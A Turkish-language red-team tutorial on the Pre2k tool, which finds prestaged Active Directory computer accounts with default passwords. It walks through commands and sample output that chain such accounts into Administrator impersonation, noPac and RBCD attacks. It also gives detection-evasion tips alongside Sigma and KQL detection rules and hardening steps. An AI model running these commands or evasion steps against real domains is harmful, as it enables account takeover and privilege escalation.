# Pre2k

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Active Directory'de önceden oluşturulmuş (prestaged) veya eski Pre-Windows 2000 makine hesaplarını tespit eden ve varsayılan bilgisayar parolalarını (hesap adının küçük harfli hali) test ederek yetki yükseltme kapısı açan sömürü aracı.

---

## 1. Genel Bakış ve Amaç

**Pre2k** (Garrett Foster / @cnotin tarafından geliştirilen ve genişletilen), Active Directory etki alanlarında bilgisayar hesaplarının oluşturulma ve ön yapılandırma (prestaging) mantığındaki tarihsel bir zafiyeti hedef alan özelleşmiş bir saldırı ve denetim aracıdır.

Active Directory mimarisinde bir bilgisayar hesabı oluşturulduğunda (örneğin Active Directory Users and Computers arayüzünden veya SCCM/MDT kurulumları için prestaged edildiğinde), o bilgisayar henüz fiziksel olarak etki alanına dahil edilmemişse (unjoined) işletim sistemi bu hesaba varsayılan bir başlangıç parolası atar. Microsoft'un Pre-Windows 2000 uyumluluk standartlarına göre bu başlangıç parolası:
- Bilgisayarın `sAMAccountName` değerinin küçük harfli halidir (örneğin hesap adı `DESKTOP-HR01$` ise varsayılan parola `desktop-hr01`).
- Bazen hesap adının sonundaki `$` işareti olmadan veya doğrudan hesap adının kendisi olarak tanımlanır.

Pre2k, LDAP üzerinden etki alanındaki tüm bilgisayar hesaplarını tarayarak henüz etki alanına katılmamış, şifresi hiç değiştirilmemiş (`pwdLastSet = 0` veya oluşturulma tarihiyle aynı) bilgisayar hesaplarını filtreler. Ardından Kerberos AS-REQ veya NTLM protokolü üzerinden bu hesapların varsayılan parolalarını test eder.

Başarılı bir şekilde ele geçirilen bilgisayar hesabı bir saldırgana etki alanında geçerli bir kimlik kazandırmakla kalmaz; **RBCD (Resource-Based Constrained Delegation)**, **S4U2self/S4U2proxy** veya **noPac (CVE-2021-42278)** zincirleri üzerinden doğrudan Domain Admin yetkisine sıçrama imkanı tanır.

```
       [ Saldırgan ]
             |
     1. LDAP Sorgusu: (sAMAccountType=805306369) & (pwdLastSet=0 veya eski)
             v
       [ Domain Controller ]
             |
     2. Bilgisayar Listesi Döner: PC-FINANCE01$, SRV-TEST$, BACKUP-OLD$
             |
             v
       [ Pre2k Motoru ]
             |
     3. Varsayılan Parola Tahmini: "pc-finance01"
             |
     4. Kerberos AS-REQ (KDC Port 88)
             v
       [ Domain Controller (KDC) ]
             |
     5. AS-REP: Kerberos Pre-Auth Başarılı! (TGT Bileti Üretildi)
             v
       [ Saldırgan: Makine Hesabı Ele Geçirildi! ] ===> RBCD / S4U2self Sömürüsü
```

### Neden Önemli?
- **Hesap Kilitleme Politikasından (Lockout) Muafiyet:** Birçok Active Directory ortamında kullanıcı hesapları 3 veya 5 hatalı denemede kilitlenirken, makine hesapları (`$`) hizmet sürekliliği gerekçesiyle hesap kilitleme politikasından muaf tutulur.
- **Kritik Sömürülerin Ön Koşulu:** noPac (sAMAccountName Spoofing) veya RBCD saldırılarını gerçekleştirebilmek için saldırganın etki alanında geçerli en az bir makine hesabına ihtiyacı vardır (`MachineAccountQuota = 0` olsa bile Pre2k ile boşta duran bir makine hesabı ele geçirilebilir).
- **İç Ağda Görünmezlik:** Makine hesabı üzerinden yapılan sorgular EDR ve SIEM sistemlerinde genellikle standart arka plan işletim sistemi trafiği olarak algılanır.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Pre2k | Kerbrute | NetExec (CrackMapExec) |
|---|---|---|---|
| **Ana Odak** | Prestaged / Pre2k Makine Hesapları | Kullanıcı / Parola Püskürtme | Çok Amaçlı Ağ Protokol Denetimi |
| **Parola Mantığı** | Otomatik makine adı türetme (`lower(name)`) | Dışarıdan sağlanan wordlist | Dışarıdan sağlanan wordlist |
| **Protokol** | Kerberos AS-REQ / LDAP | Kerberos Pre-Auth (Port 88) | SMB, LDAP, WinRM |
| **Lockout Riski** | Yok / Çok Düşük (Makine hesapları) | Kullanıcı hesaplarında yüksek | Kullanıcı hesaplarında yüksek |
| **Raporlama** | TGT üretme ve sömürüye hazır çıktı | Kullanıcı geçerlilik listesi | Kimlik doğrulama başarı tablosu |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Pre2k Python tabanlı bir araç olup Impacket kütüphanesini kullanır.

```bash
pre2k <Etki_Alanı>/<Kullanıcı>:<Parola> -dc-ip <DC_IP> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-dc-ip` | Hedef Domain Controller'ın IP adresi (Zorunlu). | `-dc-ip 192.168.1.10` |
| `-u, -p` | Etki alanında kimlik doğrulaması yapmak için standart kullanıcı bilgisi. | `-u ahmet -p Sifre123!` |
| `-d, --domain` | Hedef etki alanı FQDN adı. | `-d lab.local` |
| `--hashes` | Parola yerine NTLM hash ile kimlik doğrulama (Pass-the-Hash). | `--hashes :aad3b...:e19cc...` |
| `-k, --kerberos` | LDAP ve doğrulama sorgularını Kerberos biletleriyle yürütür. | `-k` |
| `--target-ou` | Yalnızca belirli bir OU altındaki bilgisayar hesaplarını tarar. | `--target-ou "OU=Staged,DC=lab,DC=local"` |
| `--dump` | Ele geçirilen hesapların NTLM hash'lerini veya Kerberos TGT'lerini diske kaydeder. | `--dump` |
| `-v, --verbose` | Ayrıntılı hata ve protokol çıktılarını gösterir. | `-v` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Etki Alanı Taraması ve Varsayılan Parola Testi

Düşük yetkili bir etki alanı kullanıcısıyla tüm ortamdaki bilgisayarların taranması.

```bash
pre2k lab.local/can.oz:Parola123! -dc-ip 192.168.1.10
```

```text
[*] Connecting to LDAP service at 192.168.1.10...
[*] Authenticated as LAB\can.oz
[*] Querying for Pre-Windows 2000 and prestaged computer accounts...
[*] Found 142 total computer accounts in Active Directory.
[*] Found 4 potentially prestaged/vulnerable accounts (pwdLastSet check).
[-] Testing DESKTOP-DEV01$ with password 'desktop-dev01'... FAILED
[-] Testing SRV-FILE02$ with password 'srv-file02'... FAILED
[+] SUCCESS! Account: LAB\PC-STAGING01$
    Password: pc-staging01
    sAMAccountName: PC-STAGING01$
    DistinguishedName: CN=PC-STAGING01,OU=Workstations,DC=lab,DC=local
[*] Valid credentials found! Computer account is compromised.
```
*Analiz:* LDAP sorgusu 4 şüpheli makine tespit etti. `PC-STAGING01$` makine hesabının parolasının varsayılan olarak `pc-staging01` olduğu doğrulandı ve ele geçirildi.

---

### Senaryo 2: Kerberos TGT Bileti İsteme ve Çevrimdışı Kaydetme

Ele geçirilen makine hesabı için doğrudan Kerberos Key Distribution Center'dan (KDC) TGT bileti alma.

```bash
getTGT.py lab.local/PC-STAGING01\$:pc-staging01 -dc-ip 192.168.1.10
```

```text
[*] Requesting TGT for LAB\PC-STAGING01$
[*] Saving ticket in PC-STAGING01$.ccache
[+] TGT ticket successfully retrieved!
```
*Analiz:* `PC-STAGING01$` makine hesabı adına TGT üretilerek `.ccache` dosyası olarak kaydedildi. Bu bilet `KRB5CCNAME` ortam değişkeniyle tüm araçlara aktarılabilir.

---

### Senaryo 3: S4U2self ile Domain Admin Yetkisi Taklit Etme (Privilege Escalation)

Eğer ele geçirilen makine hesabında Kısıtlı Yetkilendirme (Constrained Delegation) tanımlıysa, makine hesabı üzerinden Domain Admin adına servis bileti (TGS) üretme.

```bash
export KRB5CCNAME=PC-STAGING01$.ccache
getST.py -k -no-pass -spn cifs/target-server.lab.local -impersonate Administrator lab.local/PC-STAGING01\$
```

```text
[*] Requesting S4U2self ticket for Administrator...
[*] Requesting S4U2proxy ticket for cifs/target-server.lab.local...
[+] Saving ticket in Administrator.ccache
[+] Successfully impersonated Administrator!
```
*Analiz:* Ele geçirilen makine hesabı kullanılarak `Administrator` adına CIFS servis bileti alındı ve hedef sunucu üzerinde tam yönetici yetkisi elde edildi.

---

### Senaryo 4: Belirli Bir OU Üzerinde Odaklanmış Tarama (OPSEC)

Tüm dizini taramak yerine yalnızca sistem yöneticilerinin yeni makineleri eklediği hazırlık (Staging) OU'sunu hedefleme.

```bash
pre2k lab.local/can.oz:Parola123! -dc-ip 192.168.1.10 --target-ou "OU=PreStaged,OU=Computers,DC=lab,DC=local"
```

```text
[*] Scoping LDAP search to: OU=PreStaged,OU=Computers,DC=lab,DC=local
[*] Found 3 accounts in target OU.
[+] SUCCESS! Account: LAB\SRV-BACKUP-NEW$ (Password: srv-backup-new)
```
*Analiz:* Arama daraltıldığı için LDAP loglarında şüphe çekilmedi ve hedef OU içerisindeki zafiyetli sunucu hesabı yakalandı.

---

### Senaryo 5: noPac (CVE-2021-42278) Saldırısında Ön Adım Olarak Kullanma

Etki alanında standart kullanıcıların makine hesabı ekleme hakkı (`ms-DS-MachineAccountQuota = 0`) kapalıysa, noPac saldırısı için Pre2k ile bulunan hesap kullanılır.

```bash
# 1. Pre2k ile bulunan hesap: PC-STAGING01$
# 2. Hesabın sAMAccountName değeri DC adıyla değiştirilir (noPac):
renameMachine.py lab.local/PC-STAGING01\$:pc-staging01 -new-name DC01 -dc-ip 192.168.1.10
```
*Analiz:* Saldırgan sıfırdan hesap açamadığı senaryoda, Pre2k ile ele geçirdiği makine hesabını DC adıyla maskeleyerek sAMAccountName Spoofing saldırısını başarıyla gerçekleştirdi.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] KDC_ERR_PREAUTH_FAILED` | Bilgisayar hesabı prestaged edilmiş ancak etki alanına dahil edilmiş veya parolası değiştirilmiştir. | Bu hesap zafiyetli değildir; sonraki makine hesaplarına geçin. |
| `[-] KDC_ERR_CLIENT_REVOKED` | Makine hesabı etki alanında devre dışı (Disabled) durumdadır. | LDAP sorgusunda `!(userAccountControl:1.2.840.113556.1.4.803:=2)` filtresi kullanarak devre dışı hesapları eleyin. |
| `LDAPSessionError: strongAuthRequired` | Domain Controller imzasız (Unsigned) LDAP sorgularını reddediyor. | `-k` (Kerberos) bayrağını ekleyin veya LDAPS (`ldaps://`) protokolünü kullanın. |
| `No computer accounts found with matching criteria` | Ortamda SCCM/MDT prestaged makineler bulunmamakta veya LAPS kuruludur. | Alternatif parola püskürtme yöntemlerine (Kerbrute, Spray-Passwords) veya zorlamalı kimlik araçlarına (Coercer) geçin. |
| `Clock skew too great (Kerberos error)` | Saldırgan makinesinin yerel saati ile Domain Controller saati arasında 5 dakikadan fazla fark vardır. | Saati DC ile eşitleyin: `sudo ntpdate 192.168.1.10` veya `rdate -n 192.168.1.10`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 4768 (A Kerberos authentication ticket (TGT) was requested):**
  - Result Code: `0x18` (Pre-authentication failed - parola denemesi başarısız).
  - Result Code: `0x0` (Başarılı TGT talebi).
  - Target Account: `COMPUTER$` formatında makine hesabı.
- **Domain Controller Event ID 4625 (An account failed to log on):**
  - Logon Type `3` (Ağdan oturum açma hatası).
- **Domain Controller Event ID 1644 (Directory Service RPC Search):**
  - LDAP filtresinde `(sAMAccountType=805306369)` veya `(pwdLastSet=0)` aramaları.

### 5.2 Ağ ve EDR İmzaları
- **AS-REQ Püskürtme Anomalisi:** Ağ izleme sistemleri (NDR), tek bir IP'den ardı ardına farklı bilgisayar hesapları adına gelen Kerberos AS-REQ paketlerini anomali olarak tespit eder.
- **Kısa Ömürlü Oturumlar:** Makine hesabının bir anda daha önce hiç görülmediği bir IP adresinden Kerberos bileti istemesi (EDR UEBA anomali puanı üretir).

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1110.001** | Brute Force: Password Guessing | Varsayılan makine parolalarının denenmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Ele geçirilen bilgisayar hesaplarının kullanılması. |
| **T1558** | Steal or Forge Kerberos Tickets | TGT bileti elde etme ve S4U yetkilendirmesi. |
| **T1087.002** | Account Discovery: Domain Account | LDAP üzerinden makine hesaplarının taranması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Yüksek Hacimli Denemeler:** Yüzlerce hesaba aynı anda AS-REQ göndermek SIEM'i tetikler. | Ön filtreleme yaparak yalnızca `pwdLastSet=0` olan az sayıdaki prestaged makineyi hedefleyin. |
| **IP İmzası:** Doğrudan Kali IP'sinden AS-REQ atmak tespit edilir. | Ele geçirilmiş bir iç Windows hostu üzerinden Kerberos biletini talep edin. |
| **Kerberos vs NTLM:** NTLM log üretimi Kerberos'a göre daha belirgindir. | Mutlaka Kerberos (`-k`) modunu tercih edin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — Bilgisayar Hesaplarına Parola Denemesi Tespiti)
```yaml
title: Multiple Kerberos Pre-Auth Failures on Computer Accounts
status: experimental
description: Kısa sürede çok sayıda makine hesabında (AccountName ending with $) Kerberos 0x18 hatası oluşması.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4768
        Status: '0x18'
        TargetUserName|endswith: '$'
    condition: selection | count() by SourceAddress > 10
level: high
```

#### Tespit Kuralı (KQL — Microsoft Sentinel / Defender for Identity)
```kql
// Makine Hesabına Çok Sayıda Başarısız Kerberos Pre-Auth Denemesi
IdentityLogonEvents
| where Protocol == "Kerberos"
| where ActionType == "LogonFailed"
| where FailureReason == "0x18"
| where TargetAccountDisplayName endswith "$"
| summarize FailedCount = count(), Victims = make_set(TargetAccountDisplayName) by SourceIPAddress, bin(Timestamp, 10m)
| where FailedCount > 5
| order by FailedCount desc
```

#### Sertleştirme ve Önleme Adımları
1. **LAPS (Local Administrator Password Solution) Yaygınlaştırma:** Tüm bilgisayar hesaplarında ve prestaged makinelerde rastgele parola atanmalıdır.
2. **Kullanılmayan Prestaged Hesapları Temizleme:** Etki alanına 30 günden uzun süredir katılmamış bilgisayar hesapları otomatik scriptlerle silinmelidir.
3. **MachineAccountQuota Değerini Sıfırlama:** Standart kullanıcıların etki alanına yeni makine eklemesi engellenmelidir (`ms-DS-MachineAccountQuota = 0`).
4. **Pre-Windows 2000 Compatible Access Grubunu Daraltma:** Bu gruptan `Everyone` ve `Authenticated Users` çıkarılarak nesne özniteliklerinin anonim/düşük yetkili okunması kısıtlanmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart Pre2k taraması (Kullanıcı adı ve parola ile)
pre2k sirket.local/ahmet:Parola123 -dc-ip 192.168.1.10
```
- **Ne Yapar?:** LDAP üzerinden zafiyetli prestaged makineleri bulur ve varsayılan parolalarını test eder.
- **Ne Zaman Kullanılır?:** Etki alanında standart bir kullanıcı hesabı elde edildiğinde.
- **Parametreler:** `sirket.local/ahmet:Parola123`: Kimlik; `-dc-ip`: Domain Controller adresi.

```bash
# 2. Pass-the-Hash ile Pre2k çalıştırma
pre2k sirket.local/ahmet@192.168.1.10 -hashes :e19ccf750c72545f1b5f1b2b80429f08
```
- **Ne Yapar?:** Açık metin parola olmadan NTLM hash ile LDAP sorgusu ve tarama yapar.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca NTLM hash çekilebildiğinde.
- **Parametreler:** `-hashes`: NTLM hash formatı.

```bash
# 3. Yalnızca belirli bir OU altını tarama (Hedefli & OPSEC)
pre2k sirket.local/ahmet:Pass123 -dc-ip 192.168.1.10 --target-ou "OU=StagedComputers,DC=sirket,DC=local"
```
- **Ne Yapar?:** Taramayı sadece yeni eklenen veya hazırlanmış bilgisayarların bulunduğu OU ile sınırlar.
- **Ne Zaman Kullanılır?:** Büyük etki alanlarında gürültü yapmamak ve zaman kazanmak için.
- **Parametreler:** `--target-ou`: Hedef LDAP OU yolu.

```bash
# 4. Ele geçirilen makine hesabı için TGT talep etme
getTGT.py sirket.local/PC-TEST01\$:pc-test01 -dc-ip 192.168.1.10
```
- **Ne Yapar?:** Doğrulanan makine parolasını kullanarak KDC'den Kerberos TGT bileti çeker.
- **Ne Zaman Kullanılır?:** Makine hesabı kimliği ile Kerberos operasyonlarına devam etmek için.
- **Parametreler:** Makine hesabı adı ve küçük harfli parolası.

```bash
# 5. Kerberos bileti (.ccache) ile yetkilendirme (S4U2self)
getST.py -k -no-pass -spn cifs/target.sirket.local -impersonate Administrator sirket.local/PC-TEST01\$
```
- **Ne Yapar?:** Elde edilen makine TGT'si ile hedef sunucuda Administrator yetkisi taklit eden servis bileti alır.
- **Ne Zaman Kullanılır?:** Kısıtlı Yetkilendirme zafiyetini sömürürken.
- **Parametreler:** `-k`: Ccache kullan; `-impersonate`: Taklit edilecek kullanıcı.

```bash
# 6. Ele geçirilen makine hesabı ile LDAP sorgusu çalıştırma
ldapdomaindump -u 'sirket.local\PC-TEST01$' -p 'pc-test01' 192.168.1.10
```
- **Ne Yapar?:** Ele geçirilen bilgisayar hesabını kullanarak tüm etki alanı verilerini LDAP'tan çeker.
- **Ne Zaman Kullanılır?:** Standart kullanıcı hesabı kilitlendiğinde veya bulunmadığında.
- **Parametreler:** `-u`: Makine hesabı; `-p`: Makine parolası.

```bash
# 7. Makine hesabının parolasını NetExec ile doğrulama
nxc smb 192.168.1.10 -u 'PC-TEST01$' -p 'pc-test01'
```
- **Ne Yapar?:** Makine kimlik bilgilerinin SMB üzerinden geçerliliğini ve haklarını teyit eder.
- **Ne Zaman Kullanılır?:** Pre2k bulgusunu bağımsız bir araçla doğrulamak için.
- **Parametreler:** `-u`: Kullanıcı; `-p`: Parola.

```bash
# 8. LDAP üzerinden pwdLastSet=0 olan hesapları manuel arama
ldapsearch -x -H ldap://192.168.1.10 -D "ahmet@sirket.local" -w "Pass123" -b "DC=sirket,DC=local" "(&(sAMAccountType=805306369)(pwdLastSet=0))" sAMAccountName
```
- **Ne Yapar?:** Parolası hiç değiştirilmemiş bilgisayar hesaplarını doğrudan LDAP filtresiyle döker.
- **Ne Zaman Kullanılır?:** Pre2k çalıştırmadan önce zafiyetli hesap olup olmadığını anlamak için.
- **Parametreler:** LDAP arama filtresi.

```powershell
# 9. PowerView ile prestaged bilgisayar hesaplarını tespit etme
Get-DomainComputer -LDAPFilter "(pwdLastSet=0)" | Select-Object name, distinguishedname, whencreated
```
- **Ne Yapar?:** PowerShell üzerinden oluşturulmuş ancak hiç oturum açmamış makine hesaplarını listeler.
- **Ne Zaman Kullanılır?:** Windows hostundan hızlı keşif ve hedef tespiti yaparken.
- **Parametreler:** `Get-DomainComputer` LDAP filtresi.

```bash
# 10. Ele geçirilen hesapla RBCD yetkisi tanımlama (rbcd.py)
python3 rbcd.py -delegate-to 'TARGET-SERVER$' -delegate-from 'PC-TEST01$' -action write -dc-ip 192.168.1.10 'sirket.local/ahmet:Pass123'
```
- **Ne Yapar?:** Ele geçirilen makine hesabına hedef sunucu üzerinde RBCD yetkisi tanımlayarak hedefte SYSTEM hakkı kazandırır.
- **Ne Zaman Kullanılır?:** Pre2k ile kazanılan makine hesabını yanal harekette kullanmak için.
- **Parametreler:** `-delegate-to`: Hedef sunucu; `-delegate-from`: Ele geçirilen makine hesabı.

---

## Kaynaklar

- **Pre2k GitHub Deposu:** [https://github.com/cnotin/pre2k](https://github.com/cnotin/pre2k)
- **Garrett Foster — Abusing Pre-Windows 2000 Computer Accounts:** [https://github.com/garrettfoster13](https://github.com/garrettfoster13)
- **The Hacker Recipes — Machine Account Pre-Windows 2000:** [https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)

---

> **Önceki:** [← Crop](./Crop.md) · **Sonraki:** [Coercer →](./Coercer.md)

